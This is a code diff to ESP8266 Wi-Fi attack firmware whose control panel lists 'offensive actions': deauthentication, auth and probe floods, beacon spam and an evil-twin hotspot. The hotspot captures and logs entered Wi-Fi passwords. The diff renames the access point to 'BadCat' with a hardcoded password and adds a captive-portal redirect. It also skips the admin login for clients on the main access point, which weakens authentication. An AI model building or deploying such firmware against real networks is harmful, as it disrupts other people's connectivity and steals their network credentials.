@@ -128,8 +128,9 @@ unsigned long beacon_now = 0;
 
 void clearArray() {
   for (int i = 0; i < 16; i++) {
-    _Network _network;
-    _networks[i] = _network;
+    _networks[i].ssid = "";
+    _networks[i].ch = 0;
+    memset(_networks[i].bssid, 0, 6);
   }
 }
 
@@ -232,7 +233,7 @@ void setup() {
   wifi_set_promiscuous_rx_cb(sniffer_callback);
   wifi_promiscuous_enable(1);
   WiFi.softAPConfig(IPAddress(192, 168, 4, 1) , IPAddress(192, 168, 4, 1) , IPAddress(255, 255, 255, 0));
-  WiFi.softAP("BlueCat", "Cat@1234");
+  WiFi.softAP("BadCat", "Cat@1234");
   dnsServer.start(53, "*", IPAddress(192, 168, 4, 1));
 
   // Add default beacons
@@ -265,7 +266,10 @@ void setup() {
     }
   });
   
-  webServer.onNotFound(handleIndex);
+  webServer.onNotFound([]() {
+    webServer.sendHeader("Location", String("http://") + WiFi.softAPIP().toString() + "/", true);
+    webServer.send(302, "text/plain", "");
+  });
   webServer.begin();
 }
 
@@ -344,26 +348,26 @@ void handleResult() {
     WiFi.softAPdisconnect (true);
     delay(100);
     WiFi.softAPConfig(IPAddress(192, 168, 4, 1) , IPAddress(192, 168, 4, 1) , IPAddress(255, 255, 255, 0));
-    WiFi.softAP("BlueCat", "Cat@1234");
+    WiFi.softAP("BadCat", "Cat@1234");
     dnsServer.start(53, "*", IPAddress(192, 168, 4, 1));
     Serial.println("Good password was entered !");
     Serial.println(_correct);
   }
 }
 
-String _tempHTML = "<!DOCTYPE html><html><head><meta name='viewport' content='initial-scale=1.0, width=device-width'>"
-"<style>:root{--bg:#050510;--panel-bg:rgba(10,15,30,0.85);--border:#00e5ff;--text:#e0f7fa;--accent:#00e5ff;--accent-hover:#00b3cc;--red:#ff0055;--green:#00ff88;--glow-cyan:0 0 5px rgba(0,229,255,0.4),0 0 10px rgba(0,229,255,0.2);--glow-red:0 0 5px rgba(255,0,85,0.4),0 0 10px rgba(255,0,85,0.2);--glow-green:0 0 5px rgba(0,255,136,0.4),0 0 10px rgba(0,255,136,0.2)}*{box-sizing:border-box}body{background-color:var(--bg);background-image:linear-gradient(0deg,transparent 24%,rgba(0,229,255,0.05) 25%,rgba(0,229,255,0.05) 26%,transparent 27%,transparent 74%,rgba(0,229,255,0.05) 75%,rgba(0,229,255,0.05) 76%,transparent 77%,transparent),linear-gradient(90deg,transparent 24%,rgba(0,229,255,0.05) 25%,rgba(0,229,255,0.05) 26%,transparent 27%,transparent 74%,rgba(0,229,255,0.05) 75%,rgba(0,229,255,0.05) 76%,transparent 77%,transparent);background-size:40px 40px;color:var(--text);font-family:'Courier New',Courier,monospace;margin:0;padding:20px;line-height:1.6}.content{max-width:800px;margin:auto}h2{text-align:center;font-size:26px;margin-bottom:30px;font-weight:bold;color:var(--accent);text-transform:uppercase;letter-spacing:2px;text-shadow:var(--glow-cyan)}h2 svg{width:32px;height:32px;fill:var(--accent);filter:drop-shadow(0 0 4px var(--accent)) drop-shadow(0 0 8px var(--accent));vertical-align:middle;margin-bottom:4px;margin-right:8px}.panel{background:var(--panel-bg);padding:20px;border-radius:4px;border:1px solid var(--accent);margin-bottom:25px;box-shadow:0 0 10px rgba(0,229,255,0.2);backdrop-filter:blur(5px);position:relative}.panel::before,.panel::after{content:'';position:absolute;width:15px;height:15px;border:2px solid var(--accent);pointer-events:none}.panel::before{top:-2px;left:-2px;border-right:none;border-bottom:none}.panel::after{bottom:-2px;right:-2px;border-left:none;border-top:none}h3{margin-top:0;color:var(--accent);font-size:16px;border-bottom:1px dashed var(--accent);padding-bottom:8px;margin-bottom:20px;text-transform:uppercase;letter-spacing:1px}h3 svg{width:18px;height:18px;fill:var(--accent);filter:drop-shadow(0 0 3px var(--accent)) drop-shadow(0 0 6px var(--accent));vertical-align:middle;margin-bottom:4px;margin-right:6px}.table-wrap{overflow-x:auto}table{width:100%;border-collapse:collapse;margin-top:5px;white-space:nowrap}th,td{border-bottom:1px dashed rgba(0,229,255,0.3);padding:12px 15px;text-align:left;font-size:14px}th{background-color:rgba(0,229,255,0.05);font-weight:bold;color:var(--accent);text-transform:uppercase;letter-spacing:1px}tr:hover td{background:rgba(0,229,255,0.1)}button{background-color:transparent;color:var(--accent);border:1px solid var(--accent);box-shadow:0 0 8px rgba(0,229,255,0.2) inset;padding:10px 12px;border-radius:2px;cursor:pointer;transition:all 0.3s ease;font-weight:bold;font-size:14px;font-family:inherit;text-transform:uppercase;letter-spacing:1px;display:flex;align-items:center;justify-content:center;gap:8px;width:100%}button svg{width:14px;height:14px;fill:currentColor;flex-shrink:0}button:hover{background-color:var(--accent);color:#000;box-shadow:var(--glow-cyan);transform:translateY(-1px)}button:active{transform:translateY(0)}button.red{color:var(--red);border-color:var(--red);box-shadow:0 0 8px rgba(255,0,85,0.2) inset}button.red:hover{background-color:var(--red);color:#000;box-shadow:var(--glow-red)}button.green{color:var(--green);border-color:var(--green);box-shadow:0 0 8px rgba(0,255,136,0.2) inset}button.green:hover{background-color:var(--green);color:#000;box-shadow:var(--glow-green)}button:disabled{opacity:0.3;cursor:not-allowed;transform:none;background:transparent;color:var(--accent);box-shadow:none}table button{padding:6px 12px;font-size:12px;width:auto}input[type='text'],input[type='password'],select{padding:12px 15px;background:rgba(0,0,0,0.6);border:1px solid var(--accent);color:var(--accent);border-radius:2px;font-size:14px;font-family:inherit;transition:0.3s;width:100%;margin-bottom:15px}input:focus,select:focus{outline:none;box-shadow:var(--glow-cyan);background:rgba(0,229,255,0.05)}label{font-size:13px;color:var(--text);margin-bottom:5px;display:block;text-transform:uppercase}.flex{display:flex;gap:15px;align-items:center;width:100%}.flex form{flex:1;width:100%}.badge{background:rgba(0,229,255,0.1);border:1px solid var(--accent);padding:6px 12px;border-radius:2px;font-size:13px;margin:4px;display:inline-flex;align-items:center}.badge a{color:var(--red);text-decoration:none;font-weight:bold;margin-left:10px;font-size:16px}.badge a:hover{text-shadow:var(--glow-red)}.radio-group label{display:flex;align-items:center;gap:10px;padding:10px 0;cursor:pointer;font-size:14px}.radio-group input[type='radio']{width:16px;height:16px;margin:0;accent-color:var(--accent);cursor:pointer}@media(max-width:600px){body{padding:10px}h2{font-size:20px;line-height:1.4}h2 svg{width:24px;height:24px;display:block;margin:0 auto 10px auto}.panel{padding:15px}.flex{flex-direction:column;gap:10px}input[type='text'],select{margin-bottom:10px}button{font-size:13px}}</style>"
-"</head><body><div class='content'>"
-"<h2><svg viewBox='0 0 24 24'><path d='M11 2h2v3h-2zm0 17h2v3h-2zm9-9h3v2h-3zm-17 0h3v2H3zm17-4h3v2h-3zm-17 0h3v2H3zm17 8h3v2h-3zm-17 0h3v2H3zm5-11h4V2h-4zm0 17h4v3h-4zM6 6h12v12H6zm2 2h8v8H8z'/></svg>ESP8266 CONTROL PANEL</h2>"
-"<div class='panel'><h3><svg viewBox='0 0 24 24'><path d='M22.7 19l-9.1-9.1c.9-2.3.4-5-1.5-6.9-2-2-5-2.4-7.4-1.1L9 6 6 9 1.6 4.7C.4 7.1.9 10.1 2.9 12.1c1.9 1.9 4.6 2.4 6.9 1.5l9.1 9.1c.4.4 1 .4 1.4 0l2.3-2.3c.5-.4.5-1.1.1-1.4z'/></svg>OFFENSIVE ACTIONS</h3>"
-"<div class='flex'>"
-"<form method='post' action='/?deauth={deauth}'><button {disabled} class='{deauth_class}'><svg viewBox='0 0 24 24'><path d='M8 5v14l11-7z'/></svg>{deauth_button}</button></form>"
-"<form method='post' action='/?authflood={authflood}'><button {disabled} class='{auth_class}'><svg viewBox='0 0 24 24'><path d='M8 5v14l11-7z'/></svg>{auth_button}</button></form>"
-"<form method='post' action='/?hotspot={hotspot}'><button {disabled} class='{hotspot_class}'><svg viewBox='0 0 24 24'><path d='M8 5v14l11-7z'/></svg>{hotspot_button}</button></form>"
-"</div>"
-"<div class='flex' style='margin-top:15px;'>"
-"<form method='post' action='/?randbeacon={randbeacon}'><button class='{rand_class}'><svg viewBox='0 0 24 24'><path d='M8 5v14l11-7z'/></svg>{rand_button}</button></form>"
-"<form method='post' action='/?probeflood={probeflood}'><button class='{probe_class}'><svg viewBox='0 0 24 24'><path d='M8 5v14l11-7z'/></svg>{probe_button}</button></form>"
+const char _tempHTML[] PROGMEM = "<!DOCTYPE html><html><head><meta name='viewport' content='initial-scale=1.0, width=device-width'>\n"
+"<style>:root{--bg:#050510;--panel-bg:rgba(10,15,30,0.85);--border:#00e5ff;--text:#e0f7fa;--accent:#00e5ff;--accent-hover:#00b3cc;--red:#ff0055;--green:#00ff88;--glow-cyan:0 0 5px rgba(0,229,255,0.4),0 0 10px rgba(0,229,255,0.2);--glow-red:0 0 5px rgba(255,0,85,0.4),0 0 10px rgba(255,0,85,0.2);--glow-green:0 0 5px rgba(0,255,136,0.4),0 0 10px rgba(0,255,136,0.2)}*{box-sizing:border-box}body{background-color:var(--bg);background-image:linear-gradient(0deg,transparent 24%,rgba(0,229,255,0.05) 25%,rgba(0,229,255,0.05) 26%,transparent 27%,transparent 74%,rgba(0,229,255,0.05) 75%,rgba(0,229,255,0.05) 76%,transparent 77%,transparent),linear-gradient(90deg,transparent 24%,rgba(0,229,255,0.05) 25%,rgba(0,229,255,0.05) 26%,transparent 27%,transparent 74%,rgba(0,229,255,0.05) 75%,rgba(0,229,255,0.05) 76%,transparent 77%,transparent);background-size:40px 40px;color:var(--text);font-family:'Courier New',Courier,monospace;margin:0;padding:20px;line-height:1.6}.content{max-width:800px;margin:auto}h2{text-align:center;font-size:26px;margin-bottom:30px;font-weight:bold;color:var(--accent);text-transform:uppercase;letter-spacing:2px;text-shadow:var(--glow-cyan)}h2 svg{width:32px;height:32px;fill:var(--accent);filter:drop-shadow(0 0 4px var(--accent)) drop-shadow(0 0 8px var(--accent));vertical-align:middle;margin-bottom:4px;margin-right:8px}.panel{background:var(--panel-bg);padding:20px;border-radius:4px;border:1px solid var(--accent);margin-bottom:25px;box-shadow:0 0 10px rgba(0,229,255,0.2);backdrop-filter:blur(5px);position:relative}.panel::before,.panel::after{content:'';position:absolute;width:15px;height:15px;border:2px solid var(--accent);pointer-events:none}.panel::before{top:-2px;left:-2px;border-right:none;border-bottom:none}.panel::after{bottom:-2px;right:-2px;border-left:none;border-top:none}h3{margin-top:0;color:var(--accent);font-size:16px;border-bottom:1px dashed var(--accent);padding-bottom:8px;margin-bottom:20px;text-transform:uppercase;letter-spacing:1px}h3 svg{width:18px;height:18px;fill:var(--accent);filter:drop-shadow(0 0 3px var(--accent)) drop-shadow(0 0 6px var(--accent));vertical-align:middle;margin-bottom:4px;margin-right:6px}.table-wrap{overflow-x:auto}table{width:100%;border-collapse:collapse;margin-top:5px;white-space:nowrap}th,td{border-bottom:1px dashed rgba(0,229,255,0.3);padding:12px 15px;text-align:left;font-size:14px}th{background-color:rgba(0,229,255,0.05);font-weight:bold;color:var(--accent);text-transform:uppercase;letter-spacing:1px}tr:hover td{background:rgba(0,229,255,0.1)}button{background-color:transparent;color:var(--accent);border:1px solid var(--accent);box-shadow:0 0 8px rgba(0,229,255,0.2) inset;padding:10px 12px;border-radius:2px;cursor:pointer;transition:all 0.3s ease;font-weight:bold;font-size:14px;font-family:inherit;text-transform:uppercase;letter-spacing:1px;display:flex;align-items:center;justify-content:center;gap:8px;width:100%}button svg{width:14px;height:14px;fill:currentColor;flex-shrink:0}button:hover{background-color:var(--accent);color:#000;box-shadow:var(--glow-cyan);transform:translateY(-1px)}button:active{transform:translateY(0)}button.red{color:var(--red);border-color:var(--red);box-shadow:0 0 8px rgba(255,0,85,0.2) inset}button.red:hover{background-color:var(--red);color:#000;box-shadow:var(--glow-red)}button.green{color:var(--green);border-color:var(--green);box-shadow:0 0 8px rgba(0,255,136,0.2) inset}button.green:hover{background-color:var(--green);color:#000;box-shadow:var(--glow-green)}button:disabled{opacity:0.3;cursor:not-allowed;transform:none;background:transparent;color:var(--accent);box-shadow:none}table button{padding:6px 12px;font-size:12px;width:auto}input[type='text'],input[type='password'],select{padding:12px 15px;background:rgba(0,0,0,0.6);border:1px solid var(--accent);color:var(--accent);border-radius:2px;font-size:14px;font-family:inherit;transition:0.3s;width:100%;margin-bottom:15px}input:focus,select:focus{outline:none;box-shadow:var(--glow-cyan);background:rgba(0,229,255,0.05)}label{font-size:13px;color:var(--text);margin-bottom:5px;display:block;text-transform:uppercase}.flex{display:flex;gap:15px;align-items:center;width:100%}.flex form{flex:1;width:100%}.badge{background:rgba(0,229,255,0.1);border:1px solid var(--accent);padding:6px 12px;border-radius:2px;font-size:13px;margin:4px;display:inline-flex;align-items:center}.badge a{color:var(--red);text-decoration:none;font-weight:bold;margin-left:10px;font-size:16px}.badge a:hover{text-shadow:var(--glow-red)}.radio-group label{display:flex;align-items:center;gap:10px;padding:10px 0;cursor:pointer;font-size:14px}.radio-group input[type='radio']{width:16px;height:16px;margin:0;accent-color:var(--accent);cursor:pointer}@media(max-width:600px){body{padding:10px}h2{font-size:20px;line-height:1.4}h2 svg{width:24px;height:24px;display:block;margin:0 auto 10px auto}.panel{padding:15px}.flex{flex-direction:column;gap:10px}input[type='text'],select{margin-bottom:10px}button{font-size:13px}}</style>\n"
+"</head><body><div class='content'>\n"
+"<h2><svg viewBox='0 0 24 24'><path d='M11 2h2v3h-2zm0 17h2v3h-2zm9-9h3v2h-3zm-17 0h3v2H3zm17-4h3v2h-3zm-17 0h3v2H3zm17 8h3v2h-3zm-17 0h3v2H3zm5-11h4V2h-4zm0 17h4v3h-4zM6 6h12v12H6zm2 2h8v8H8z'/></svg>ESP8266 CONTROL PANEL</h2>\n"
+"<div class='panel'><h3><svg viewBox='0 0 24 24'><path d='M22.7 19l-9.1-9.1c.9-2.3.4-5-1.5-6.9-2-2-5-2.4-7.4-1.1L9 6 6 9 1.6 4.7C.4 7.1.9 10.1 2.9 12.1c1.9 1.9 4.6 2.4 6.9 1.5l9.1 9.1c.4.4 1 .4 1.4 0l2.3-2.3c.5-.4.5-1.1.1-1.4z'/></svg>OFFENSIVE ACTIONS</h3>\n"
+"<div class='flex'>\n"
+"<form method='post' action='/?deauth={deauth}'><button {disabled} class='{deauth_class}'><svg viewBox='0 0 24 24'><path d='M8 5v14l11-7z'/></svg>{deauth_button}</button></form>\n"
+"<form method='post' action='/?authflood={authflood}'><button {disabled} class='{auth_class}'><svg viewBox='0 0 24 24'><path d='M8 5v14l11-7z'/></svg>{auth_button}</button></form>\n"
+"<form method='post' action='/?hotspot={hotspot}'><button {disabled} class='{hotspot_class}'><svg viewBox='0 0 24 24'><path d='M8 5v14l11-7z'/></svg>{hotspot_button}</button></form>\n"
+"</div>\n"
+"<div class='flex' style='margin-top:15px;'>\n"
+"<form method='post' action='/?randbeacon={randbeacon}'><button class='{rand_class}'><svg viewBox='0 0 24 24'><path d='M8 5v14l11-7z'/></svg>{rand_button}</button></form>\n"
+"<form method='post' action='/?probeflood={probeflood}'><button class='{probe_class}'><svg viewBox='0 0 24 24'><path d='M8 5v14l11-7z'/></svg>{probe_button}</button></form>\n"
 "</div></div>";
 
 
@@ -418,7 +422,7 @@ void handleArgs() {
       yield(); 
     }
     
-    // Hop back, BlueCat never drops!
+    // Hop back, BadCat never drops!
     wifi_promiscuous_enable(0);
     wifi_set_channel(old_ch);
     wifi_promiscuous_enable(1);
@@ -487,7 +491,7 @@ void handleArgs() {
       
       WiFi.softAPdisconnect (true);
       WiFi.softAPConfig(IPAddress(192, 168, 4, 1) , IPAddress(192, 168, 4, 1) , IPAddress(255, 255, 255, 0));
-      WiFi.softAP("BlueCat", "Cat@1234");
+      WiFi.softAP("BadCat", "Cat@1234");
       dnsServer.start(53, "*", IPAddress(192, 168, 4, 1));
       
       wifi_promiscuous_enable(0);
@@ -563,7 +567,7 @@ void handleArgs() {
         WiFi.disconnect();
         
         WiFi.softAPConfig(IPAddress(192, 168, 4, 1) , IPAddress(192, 168, 4, 1) , IPAddress(255, 255, 255, 0));
-        WiFi.softAP("BlueCat", "Cat@1234");
+        WiFi.softAP("BadCat", "Cat@1234");
         dnsServer.start(53, "*", IPAddress(192, 168, 4, 1));
         wifi_promiscuous_enable(1);
         
@@ -583,7 +587,7 @@ void handleArgs() {
       
       WiFi.disconnect();
       WiFi.softAPConfig(IPAddress(192, 168, 4, 1) , IPAddress(192, 168, 4, 1) , IPAddress(255, 255, 255, 0));
-      WiFi.softAP("BlueCat", "Cat@1234");
+      WiFi.softAP("BadCat", "Cat@1234");
       dnsServer.start(53, "*", IPAddress(192, 168, 4, 1));
       
       wifi_promiscuous_enable(1);
@@ -636,7 +640,9 @@ void handleArgs() {
 }
 
 String buildAdminPage() {
-    String _html = _tempHTML;
+    String _html;
+    _html.reserve(10000);
+    _html = FPSTR(_tempHTML);
     
     // Target Network Selection table
     _html += "<div class='panel'><h3><svg viewBox='0 0 24 24'><path d='M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-1 17.93c-3.95-.49-7-3.85-7-7.93 0-.62.08-1.21.21-1.79L9 15v1c0 1.1.9 2 2 2v1.93zm6.9-2.54c-.26-.81-1-1.39-1.9-1.39h-1v-3c0-.55-.45-1-1-1H8v-2h2c.55 0 1-.45 1-1V7h2c1.1 0 2-.9 2-2v-.41c2.93 1.19 5 4.06 5 7.41 0 2.08-.8 3.97-2.1 5.39z'/></svg>TARGET NETWORKS</h3><div class='table-wrap'><table><tr><th>SSID</th><th>BSSID</th><th>Ch</th><th>Action</th></tr>";
@@ -758,7 +764,7 @@ String buildAdminPage() {
        _html += "</select>";
        
        _html += "<label>HOME WI-FI PASSWORD:</label><input type='password' name='hpass' required>";
-       _html += "<label>EXTENDER NAME (NEW WI-FI):</label><input type='text' name='essid' value='BlueCat_EXT' required>";
+       _html += "<label>EXTENDER NAME (NEW WI-FI):</label><input type='text' name='essid' value='BadCat_EXT' required>";
        _html += "<label>EXTENDER PASSWORD (MIN 8 CHARS):</label><input type='text' name='epass' value='12345678' minlength='8' required>";
        _html += "<button type='submit' class='green'><svg viewBox='0 0 24 24'><path d='M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 14.5v-9l6 4.5-6 4.5z'/></svg>INITIALIZE REPEATER</button></form>";
        _html += "<p style='font-size:12px; color:#5c6b89; margin-top:15px; border-top: 1px dashed rgba(0, 229, 255, 0.3); padding-top: 15px;'>Note: Starting Repeater disables Deauth/Phishing temporarily. Device will auto-connect to Home Wi-Fi and create a new Extender Network.</p>";
@@ -775,7 +781,8 @@ String buildAdminPage() {
 
 
 void handleIndex() {
-  if (!is_logged_in && !hotspot_active) {
+  bool needs_auth = (webServer.client().localIP() == IPAddress(192, 168, 14, 1));
+  if (needs_auth && !is_logged_in && !hotspot_active) {
     webServer.send(200, "text/html", "<html><head><meta name='viewport' content='initial-scale=1.0, width=device-width'><style>body{background:#0f1115;color:#e2e8f0;font-family:sans-serif;text-align:center;padding-top:20%;} input{padding:10px; border-radius:5px; border:1px solid #3b82f6; background:#181b21; color:#fff;} button{padding:10px 20px; background:#3b82f6; color:#fff; border:none; border-radius:5px; cursor:pointer;} </style></head><body><h2>Admin Login</h2><form action='/login' method='POST'><input type='password' name='adminpass' placeholder='Admin Password' required><br><br><button type='submit'>Login</button></form></body></html>");
     return;
   }
@@ -826,7 +833,8 @@ void handleIndex() {
 }
 
 void handleAdmin() {
-  if (!is_logged_in) {
+  bool needs_auth = (webServer.client().localIP() == IPAddress(192, 168, 14, 1));
+  if (needs_auth && !is_logged_in) {
     webServer.sendHeader("Location", "/", true);
     webServer.send(302, "text/plain", "");
     return;
